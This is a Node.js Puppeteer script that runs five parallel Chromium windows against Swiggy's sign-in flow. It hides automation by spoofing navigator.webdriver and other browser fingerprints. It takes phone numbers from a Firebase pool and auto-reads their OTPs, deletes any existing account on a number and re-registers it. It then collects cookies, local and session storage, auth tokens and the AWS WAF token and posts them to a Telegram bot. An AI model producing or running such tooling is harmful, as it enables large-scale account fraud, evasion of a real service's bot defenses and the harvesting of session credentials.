// ===== 🤖 LOCAL AUTOPILOT — 5 Parallel Chromium, Fully Automatic =====
//
// ONE BUTTON → 5 Chromium windows → Firebase → Auto OTP → Fresh Sessions → JSON to TG
//
// Usage:
//   npm run local:autopilot -- --count=5 --bot-token=TOKEN --chat-id=CHAT_ID
//
// Or set env vars in .env.local:
//   LOCAL_AUTOPILOT_COUNT=5
//   LOCAL_AUTOPILOT_BOT_TOKEN=xxx
//   LOCAL_AUTOPILOT_CHAT_ID=xxx
//   LOCAL_AUTOPILOT_TARGET=5
//   LOCAL_AUTOPILOT_MAX_MINUTES=30

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import puppeteer from 'puppeteer-core';
import crypto from 'crypto';
import dotenv from 'dotenv';

dotenv.config({ path: path.resolve('manual.env') });
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ---- Import existing bot modules ----
import { listPoolNumbers, waitForOtpCode, snapshotSeenOtpState, markPoolNumberStatus, isFirebaseConfigured } from './firebase-numbers.js';
import { freshEntriesFrom, preferOnline, getPremiumLedger, markLedger } from './number-pipeline.js';
import { getDb, saveDb, findAccountKeyByPhone, deleteAccount, syncCloudVaultNow } from './store.js';
import { normalizeIndianMobileNumber } from './phone-utils.js';

// ---- CLI / Env Config ----
const args = process.argv.slice(2);
const getArg = (name) => {
  const arg = args.find(a => a.startsWith(`--${name}=`));
  return arg ? arg.split('=')[1] : null;
};

const COUNT = parseInt(getArg('count') || process.env.LOCAL_AUTOPILOT_COUNT || '5', 10);
const BOT_TOKEN = getArg('bot-token') || process.env.LOCAL_AUTOPILOT_BOT_TOKEN || process.env.BOT_TOKEN;
const CHAT_ID = getArg('chat-id') || process.env.LOCAL_AUTOPILOT_CHAT_ID || process.env.CHAT_ID;
const TARGET = parseInt(getArg('target') || process.env.LOCAL_AUTOPILOT_TARGET || String(COUNT), 10);
const MAX_MINUTES = parseInt(getArg('max-minutes') || process.env.LOCAL_AUTOPILOT_MAX_MINUTES || '30', 10);
const HEADLESS = (getArg('headless') || process.env.LOCAL_AUTOPILOT_HEADLESS || 'false') === 'true';
const GAP_MS = parseInt(getArg('gap') || process.env.LOCAL_AUTOPILOT_GAP_MS || '3000', 10);

const PROFILE_BASE = path.join(__dirname, 'autopilot-profiles');
const OTP_CFG = {
  waitMs: 10000,
  timeoutMs: 90000,
  pollMs: 2500,
  acceptAnyAfterMs: 30000,
};

if (!BOT_TOKEN || !CHAT_ID) {
  console.error(`
❌ Missing required arguments!

Usage:
  npm run local:autopilot -- --count=5 --bot-token=123:ABC --chat-id=6484999726

Or create manual.env:
  LOCAL_AUTOPILOT_COUNT=5
  LOCAL_AUTOPILOT_BOT_TOKEN=123:ABC
  LOCAL_AUTOPILOT_CHAT_ID=6484999726
  LOCAL_AUTOPILOT_TARGET=5
  LOCAL_AUTOPILOT_MAX_MINUTES=30
`);
  process.exit(1);
}

if (!isFirebaseConfigured()) {
  console.error('❌ Firebase not configured. Set FIREBASE_DB_URL in .env');
  process.exit(1);
}

// ---- Chrome detection ----
function findChromePath() {
  if (process.env.PUPPETEER_EXECUTABLE_PATH) return process.env.PUPPETEER_EXECUTABLE_PATH;
  if (process.platform === 'win32') {
    const paths = [
      'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
      path.join(process.env.LOCALAPPDATA || '', 'Google\\Chrome\\Application\\chrome.exe'),
    ];
    for (const p of paths) if (fs.existsSync(p)) return p;
  }
  const linuxPaths = ['/usr/bin/chromium', '/usr/bin/chromium-browser', '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable'];
  for (const p of linuxPaths) if (fs.existsSync(p)) return p;
  return '/usr/bin/chromium';
}

const CHROME_PATH = findChromePath();

// ---- Telegram ----
async function sendToTelegram(text, parseMode = 'HTML') {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const form = new URLSearchParams({ chat_id: CHAT_ID, text, parse_mode: parseMode, disable_web_page_preview: 'true' });
  try { await fetch(url, { method: 'POST', body: form }); } catch (e) { console.error('TG error:', e.message); }
}

async function sendDocumentToTelegram(filePath, caption) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');
  const fileBlob = new Blob([fs.readFileSync(filePath)]);
  formData.append('document', fileBlob, path.basename(filePath));
  try { await fetch(url, { method: 'POST', body: formData }); } catch (e) { console.error('TG doc error:', e.message); }
}

// ---- Cookie string parser ----
function parseCookieString(cookieStr) {
  const cookies = [];
  for (const part of cookieStr.split(';')) {
    const trimmed = part.trim();
    if (!trimmed || !trimmed.includes('=')) continue;
    const eq = trimmed.indexOf('=');
    const name = trimmed.slice(0, eq).trim();
    const value = trimmed.slice(eq + 1).trim();
    cookies.push({ name, value, domain: '.swiggy.com', path: '/' });
  }
  return cookies;
}

// ---- Chrome launcher with anti-detection ----
async function launchChrome(profileDir, index) {
  fs.mkdirSync(profileDir, { recursive: true });
  const browser = await puppeteer.launch({
    executablePath: CHROME_PATH,
    headless: HEADLESS,
    userDataDir: profileDir,
    args: [
      '--no-first-run', '--no-default-browser-check',
      '--disable-blink-features=AutomationControlled',
      '--window-size=1366,768',
      `--window-position=${((index - 1) % 3) * 450},${Math.floor((index - 1) / 3) * 400}`,
      '--lang=en-IN,en-US,en',
    ],
    ignoreDefaultArgs: ['--enable-automation'],
  });
  const page = await browser.newPage();
  await page.setViewport({ width: 1366, height: 768 });
  await page.emulateTimezone('Asia/Kolkata').catch(() => {});
  await page.evaluateOnNewDocument(() => {
    try { delete Object.getPrototypeOf(navigator).webdriver; } catch {}
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined, configurable: true });
    Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
    if (!window.chrome) window.chrome = {};
    window.chrome.runtime = window.chrome.runtime || { connect: () => {}, sendMessage: () => {} };
    Object.defineProperty(navigator, 'languages', { get: () => ['en-IN', 'en-US', 'en'] });
  });
  return { browser, page };
}

// ---- Navigate page to Swiggy and inject cookies ----
async function navigateToSwiggy(page, url, cookieStr) {
  try {
    if (cookieStr) {
      const cookies = parseCookieString(cookieStr);
      await page.setCookie(...cookies);
    }
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
    await new Promise(r => setTimeout(r, 2000)); // Let page settle
    return true;
  } catch (e) {
    console.error(`Navigation failed: ${e.message}`);
    return false;
  }
}

// ---- Session extraction ----
async function extractSessionData(page, phone) {
  const cookies = await page.cookies();
  const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
  const localStorage = await page.evaluate(() => { const o = {}; for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); o[k] = localStorage.getItem(k); } return o; });
  const sessionStorage = await page.evaluate(() => { const o = {}; for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); o[k] = sessionStorage.getItem(k); } return o; });
  
  function decodeJwt(t) { try { return JSON.parse(Buffer.from(t.split('.')[1], 'base64').toString('utf-8')); } catch { return null; } }
  const tid = cookies.find(c => c.name === 'tid')?.value || localStorage.tid || sessionStorage.tid || '';
  const userId = tid.includes('.') ? (decodeJwt(tid)?.user_id || '') : '';
  
  return {
    phone, accountKey: `acc_${phone}`, timestamp: new Date().toISOString(),
    cookies: cookieStr, cookieArray: cookies, localStorage, sessionStorage,
    extracted: {
      tid, _session_tid: cookies.find(c => c.name === '_session_tid')?.value || localStorage._session_tid || '',
      token: cookies.find(c => c.name === 'token')?.value || localStorage.token || '',
      aws_waf_token: cookies.find(c => c.name === 'aws-waf-token')?.value || '',
      _is_logged_in: cookies.find(c => c.name === '_is_logged_in')?.value || '', user_id: userId,
    },
    url: page.url(), userAgent: await page.evaluate(() => navigator.userAgent),
  };
}

// ---- Save & send session ----
async function saveAndSendSession(sessionData, index, total) {
  const phone = sessionData.phone;
  const jsonFile = path.join(PROFILE_BASE, `session_${phone}_${Date.now()}.json`);
  fs.writeFileSync(jsonFile, JSON.stringify(sessionData, null, 2));
  
  await sendDocumentToTelegram(jsonFile,
    `✅ <b>Autopilot ${index}/${total} Done</b>\n` +
    `📱 Phone: <code>${phone}</code>\n` +
    `🔑 User ID: <code>${sessionData.extracted.user_id || 'unknown'}</code>\n` +
    `🍪 Cookies: ${sessionData.cookieArray.length}\n` +
    `🛡 WAF: ${sessionData.extracted.aws_waf_token ? 'Yes' : 'No'}\n` +
    `🆕 Kind: <b>${sessionData.kind || 'fresh'}</b>`
  );
  return jsonFile;
}

// ---- Sync bridge session cookies to our visible page ----
async function syncBridgeCookiesToPage(page, userId) {
  // The bridge stores session in activeSessions map - we need to import it
  // For now, we'll navigate to Swiggy and the cookies will be picked up from profile
  // since we use the same userDataDir
  try {
    await page.goto('https://www.swiggy.com/', { waitUntil: 'networkidle2', timeout: 15000 });
    await new Promise(r => setTimeout(r, 1000));
  } catch {}
}

// ---- Single number processor ----
async function processNumberAutomatic(entry, laneIndex, totalLanes, report) {
  const phone = entry.phone;
  const userId = `autopilot_lane_${laneIndex}`;
  const profileDir = path.join(PROFILE_BASE, `lane_${laneIndex}_${phone}`);
  
  let browser = null, page = null;
  
  const say = async (text) => {
    if (report) await report(text);
    console.log(`  [Lane ${laneIndex}] ${text.replace(/<[^>]+>/g, '').slice(0, 120)}`);
  };

  try {
    // Launch browser for this lane
    ({ browser, page } = await launchChrome(profileDir, laneIndex));
    
    // Navigate to Swiggy immediately so user sees it working
    await page.goto('https://www.swiggy.com/signin', { waitUntil: 'networkidle2', timeout: 30000 });
    await say(`🚀 <b>Lane ${laneIndex}</b> started for <code>${phone}</code> — Swiggy loaded`);
    
    // Import bridge functions
    const { 
      requestSwiggyOtpViaBridge, 
      verifySwiggyOtpViaBridge, 
      requestSwiggyDeleteOtpViaBridge, 
      verifyAndDeleteSwiggyAccountViaBridge,
      signupSwiggyViaBridge 
    } = await import('./swiggy-bridge.js');
    
    // Step 1: Send OTP
    await say(`📤 Sending OTP to Swiggy...`);
    const existingKey = findAccountKeyByPhone(getDb().config?.accounts || {}, phone) || '';
    const existingName = existingKey ? (getDb().config.accounts[existingKey]?.name || existingKey) : null;
    
    const otpReq = await requestSwiggyOtpViaBridge(userId, phone, existingKey, existingName);
    if (!otpReq?.success) throw new Error(`OTP send failed: ${otpReq?.message}`);
    
    const isNew = Boolean(otpReq.isNewUser);
    await say(isNew ? `🆕 <b>New number</b> — will register` : `♻️ <b>Existing number</b> — will delete & fresh`);
    
    // Navigate to OTP page
    await navigateToSwiggy(page, 'https://www.swiggy.com/signin?otp=true', '');
    
    // Step 2: Wait for OTP from Firebase
    const deviceIds = entry.deviceId ? [entry.deviceId] : null;
    const seen1 = await snapshotSeenOtpState(phone, { deviceIds });
    await say(`⏳ Waiting for OTP (10s + Firebase poll)...`);
    
    const otpResult = await waitForOtpCode(phone, { ...OTP_CFG, excludeIds: seen1, deviceIds });
    if (!otpResult?.code) throw new Error(`OTP not received: ${otpResult?.error || 'timeout'}`);
    
    await say(`✅ OTP received: <code>${otpResult.code}</code>`);
    
    // Show OTP on page (visual feedback)
    await page.evaluate((code) => {
      const el = document.createElement('div');
      el.style = 'position:fixed;top:20px;right:20px;background:#4CAF50;color:white;padding:15px 20px;border-radius:8px;z-index:9999;font-size:18px;font-weight:bold;font-family:monospace;box-shadow:0 4px 12px rgba(0,0,0,0.3)';
      el.innerText = `OTP: ${code}`;
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 10000);
    }, otpResult.code);
    
    // Step 3: Verify OTP
    let verifyResult = await verifySwiggyOtpViaBridge(userId, otpResult.code);
    if (!verifyResult?.success) throw new Error(`Verify failed: ${verifyResult?.message}`);
    
    syncCloudVaultNow(getDb()).catch(() => {});
    
    // Navigate to home to show logged-in state
    await navigateToSwiggy(page, 'https://www.swiggy.com/', '');
    await say(`✅ Logged in! Navigating to home...`);
    
    // Step 4: If new number → DONE
    if (isNew) {
      markLedger(phone, 'success', { accountKey: verifyResult.accountKey, kind: 'new' });
      await markPoolNumberStatus(entry, 'used');
      const sessionData = await extractSessionData(page, phone);
      sessionData.kind = 'fresh_new';
      await saveAndSendSession(sessionData, laneIndex, totalLanes);
      return { ok: true, phone, kind: 'fresh_new', accountKey: verifyResult.accountKey };
    }
    
    // Step 5: Existing number → Delete Account
    await say(`🗑️ Deleting existing account...`);
    await navigateToSwiggy(page, 'https://www.swiggy.com/my-account', '');
    
    const seen2 = await snapshotSeenOtpState(phone, { deviceIds });
    const delReq = await requestSwiggyDeleteOtpViaBridge(userId, phone, verifyResult.accountKey, verifyResult.name || null);
    if (!delReq?.success) {
      markLedger(phone, 'skipped', { reason: delReq?.message || 'Delete blocked', accountKey: verifyResult.accountKey });
      await markPoolNumberStatus(entry, 'skipped');
      throw new Error(`Delete blocked: ${delReq?.message}`);
    }
    
    const delOtp = await waitForOtpCode(phone, { ...OTP_CFG, excludeIds: seen2, deviceIds });
    if (!delOtp?.code) throw new Error(`Delete OTP not received`);
    
    await say(`✅ Delete OTP received: <code>${delOtp.code}</code>`);
    
    // Show delete OTP on page
    await page.evaluate((code) => {
      const el = document.createElement('div');
      el.style = 'position:fixed;top:20px;right:20px;background:#f44336;color:white;padding:15px 20px;border-radius:8px;z-index:9999;font-size:18px;font-weight:bold;font-family:monospace;box-shadow:0 4px 12px rgba(0,0,0,0.3)';
      el.innerText = `DELETE OTP: ${code}`;
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 10000);
    }, delOtp.code);
    
    const delRes = await verifyAndDeleteSwiggyAccountViaBridge(userId, delOtp.code, verifyResult.accountKey);
    if (!delRes?.success) throw new Error(`Delete verify failed: ${delRes?.message}`);
    
    // Purge from bot DB
    deleteAccount(verifyResult.accountKey, { purgeVault: true });
    syncCloudVaultNow(getDb()).catch(() => {});
    await say(`✅ Account deleted, purged from DB`);
    
    // Step 6: Fresh registration with same number
    await say(`🆕 Fresh registration...`);
    await navigateToSwiggy(page, 'https://www.swiggy.com/signin', '');
    
    const seen3 = await snapshotSeenOtpState(phone, { deviceIds });
    const freshOtpReq = await requestSwiggyOtpViaBridge(userId, phone, '', null);
    if (!freshOtpReq?.success) throw new Error(`Fresh OTP send failed: ${freshOtpReq?.message}`);
    
    const freshOtp = await waitForOtpCode(phone, { ...OTP_CFG, excludeIds: seen3, deviceIds });
    if (!freshOtp?.code) throw new Error(`Fresh OTP not received`);
    
    await say(`✅ Fresh OTP received: <code>${freshOtp.code}</code>`);
    
    await page.evaluate((code) => {
      const el = document.createElement('div');
      el.style = 'position:fixed;top:20px;right:20px;background:#2196F3;color:white;padding:15px 20px;border-radius:8px;z-index:9999;font-size:18px;font-weight:bold;font-family:monospace;box-shadow:0 4px 12px rgba(0,0,0,0.3)';
      el.innerText = `FRESH OTP: ${code}`;
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 10000);
    }, freshOtp.code);
    
    const freshVerify = await verifySwiggyOtpViaBridge(userId, freshOtp.code);
    if (!freshVerify?.success) throw new Error(`Fresh verify failed: ${freshVerify?.message}`);
    
    markLedger(phone, 'success', { accountKey: freshVerify.accountKey, kind: 'after-delete' });
    await markPoolNumberStatus(entry, 'used');
    
    // Navigate to home to show fresh account
    await navigateToSwiggy(page, 'https://www.swiggy.com/', '');
    await say(`✅ Fresh account ready!`);
    
    const sessionData = await extractSessionData(page, phone);
    sessionData.kind = 'fresh_after_delete';
    await saveAndSendSession(sessionData, laneIndex, totalLanes);
    
    return { ok: true, phone, kind: 'fresh_after_delete', accountKey: freshVerify.accountKey };
    
  } catch (err) {
    console.error(`  [Lane ${laneIndex}] Error:`, err.message);
    await say(`❌ <b>Failed:</b> ${err.message.slice(0, 200)}`);
    // Show error on page
    try {
      await page.evaluate((msg) => {
        const el = document.createElement('div');
        el.style = 'position:fixed;top:20px;right:20px;background:#ff9800;color:white;padding:15px 20px;border-radius:8px;z-index:9999;font-size:14px;font-family:monospace;box-shadow:0 4px 12px rgba(0,0,0,0.3);max-width:400px';
        el.innerText = `ERROR: ${msg}`;
        document.body.appendChild(el);
      }, err.message.slice(0, 200));
    } catch {}
    return { ok: false, phone, error: err.message };
  } finally {
    // Keep browser open for 10s so user can see final state
    await new Promise(r => setTimeout(r, 10000));
    if (browser) {
      try { await browser.close(); } catch {}
    }
  }
}

// ---- Main autopilot ----
async function main() {
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║         🤖 LOCAL AUTOPILOT — 5 Parallel Chromium             ║
║     Firebase → OTP → Fresh Session → JSON to Telegram        ║
╚══════════════════════════════════════════════════════════════╝

Config:
  • Lanes: ${COUNT}
  • Target: ${TARGET} fresh sessions
  • Max time: ${MAX_MINUTES} min
  • Gap: ${GAP_MS}ms
  • Headless: ${HEADLESS}
  • Chrome: ${CHROME_PATH}
  • Profiles: ${PROFILE_BASE}
`);

  await sendToTelegram(
    `🤖 <b>Local Autopilot STARTED</b>\n` +
    `🔢 Lanes: <b>${COUNT}</b> parallel\n` +
    `🎯 Target: <b>${TARGET}</b> fresh sessions\n` +
    `⏱ Max: <b>${MAX_MINUTES} min</b>\n` +
    `🕐 ${new Date().toLocaleString()}`
  );

  // Load pool
  let pool = await listPoolNumbers();
  console.log(`📋 Pool loaded: ${pool.length} numbers`);
  
  let fresh = preferOnline(freshEntriesFrom(pool));
  console.log(`🆕 Fresh available: ${fresh.length}`);
  
  if (!fresh.length) {
    console.log('❌ No fresh numbers in pool');
    await sendToTelegram('❌ No fresh numbers in Firebase pool');
    return;
  }

  // Pick entries for each lane
  const entries = fresh.slice(0, COUNT).map((e, i) => ({ ...e, laneIndex: i + 1 }));
  
  const startedAt = Date.now();
  const results = [];
  let completed = 0;

  // Run lanes in parallel with small stagger
  const lanePromises = entries.map((entry, i) => 
    (async () => {
      // Stagger start
      await new Promise(r => setTimeout(r, i * 2000));
      
      const report = async (text) => {
        const elapsed = Math.floor((Date.now() - startedAt) / 1000);
        await sendToTelegram(`🤖 <b>Autopilot</b> (${elapsed}s)\n${text}`);
      };
      
      const res = await processNumberAutomatic(entry, entry.laneIndex, COUNT, report);
      completed++;
      results.push(res);
      
      // Progress update
      const freshCount = results.filter(r => r.ok).length;
      await sendToTelegram(
        `📊 <b>Progress:</b> ${completed}/${COUNT} done\n` +
        `✅ Fresh: ${freshCount}\n` +
        `❌ Failed: ${results.filter(r => !r.ok).length}`
      );
      
      return res;
    })()
  );

  // Wait for all with timeout
  const timeoutMs = MAX_MINUTES * 60 * 1000;
  const timeoutPromise = new Promise((_, reject) => 
    setTimeout(() => reject(new Error('Max time reached')), timeoutMs)
  );

  try {
    await Promise.race([Promise.all(lanePromises), timeoutPromise]);
  } catch (e) {
    console.log('⏱ Timeout or error:', e.message);
  }

  // Summary
  const freshCount = results.filter(r => r.ok).length;
  const failedCount = results.filter(r => !r.ok).length;
  
  const summary = results.map((r, i) => 
    `${i + 1}. ${r.ok ? '✅' : '❌'} <code>${r.phone}</code> ${r.ok ? `→ ${r.kind} (${r.accountKey})` : `→ ${r.error?.slice(0, 50)}`}`
  ).join('\n');

  await sendToTelegram(
    `🏁 <b>Local Autopilot COMPLETE</b>\n` +
    `✅ Fresh sessions: <b>${freshCount}/${COUNT}</b>\n` +
    `❌ Failed: <b>${failedCount}</b>\n` +
    `⏱ Time: ${Math.floor((Date.now() - startedAt) / 1000)}s\n\n` +
    `${summary}`
  );

  console.log(`\n🏁 Done! Fresh: ${freshCount}/${COUNT}, Failed: ${failedCount}`);
  
  // Save combined results
  const combinedFile = path.join(PROFILE_BASE, `autopilot_results_${Date.now()}.json`);
  fs.writeFileSync(combinedFile, JSON.stringify(results, null, 2));
  console.log(`💾 Results: ${combinedFile}`);
}

main().catch(e => {
  console.error('❌ Fatal:', e);
  process.exit(1);
});